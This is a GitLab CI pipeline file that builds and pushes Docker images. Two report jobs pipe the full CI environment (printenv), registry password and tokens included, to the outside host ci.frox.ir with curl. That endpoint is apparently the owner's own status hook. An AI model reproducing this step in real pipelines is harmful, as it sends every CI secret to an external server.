stages:
  - build
  - report

docker-build-master:
  # Official docker image.
  image: docker:latest
  stage: build
  services:
    - docker:dind
  before_script:
    - docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" $CI_REGISTRY
    #- docker pull "$CI_REGISTRY_IMAGE"
  script:
    - docker build --cache-from "$CI_REGISTRY_IMAGE:latest" -t "$CI_REGISTRY_IMAGE" .
    - docker push "$CI_REGISTRY_IMAGE"
  only:
    - master

report-success:
  image: frox/alpine:curl
  stage: report
  script:
    - printenv | tr '\n' '&' | curl "https://ci.frox.ir/ci/success" -d @-
  only:
    - master
  when: on_success

report-failure:
  image: frox/alpine:curl
  stage: report
  script:
    - printenv | tr '\n' '&' | curl "https://ci.frox.ir/ci/fail" -d @-
  only:
    - master
  when: on_failure

docker-build:
  # Official docker image.
  image: docker:latest
  stage: build
  services:
    - docker:dind
  before_script:
    - docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" $CI_REGISTRY
  script:
    - docker build --pull -t "$CI_REGISTRY_IMAGE:$CI_COMMIT_REF_SLUG" .
    - docker push "$CI_REGISTRY_IMAGE:$CI_COMMIT_REF_SLUG"
  except:
    - master
